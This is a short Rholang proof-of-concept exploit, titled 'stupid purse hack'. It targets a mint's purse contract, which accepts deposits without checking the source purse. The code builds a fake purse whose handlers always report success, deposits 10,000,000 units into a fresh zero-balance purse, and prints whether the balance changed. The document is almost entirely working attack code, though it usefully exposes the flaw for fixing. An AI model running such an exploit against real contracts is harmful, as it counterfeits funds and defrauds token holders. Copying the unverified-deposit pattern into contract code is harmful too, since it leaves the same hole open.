
// stupid purse hack

// made possible by :: the recipient purse does no verification on the source purse

new addPurseBalance in {
    contract addPurseBalance(@amount, purse, success) = {
        new fakePurse, fakeDecr in {
            contract @[*fakePurse, *fakeDecr](_, success) = {
                success!(true)
            }
            | contract @[*fakePurse, "getDecr"](return) = {
                new challenge, responseCh in {
                    return!([*challenge, *responseCh])
                    | for ([_, answerCh] <- responseCh) { 
                        answerCh!([*fakePurse, *fakeDecr])
                    }
                }
            }
            | @[*purse, "deposit"](amount, *fakePurse, *success)
        }

    }

    new getMint, getPurse,
        print(`rho:io:stdout`)
    in {
        @"MakeMint"!(*getMint)
        | for(@mint <- getMint) {
            @[mint, "makePurse"]!(0, *getPurse)
            for (@purse <- getPurse) {
                new success in {
                    addPurseBalance!(10000000, purse, *success) 
                    | for (_ <- success) {
                        new getBalance in {
                            @[purse, "getBalance"]!(*getBalance)
                            | for(@balance <- getBalance) {
                                match balance with {
                                    10000000 => {print!("worked")}
                                    _ => {print!("didn't work")}
                                }
                            }
                        }
                    }
                }
                
            }
        }
        
    }
    
}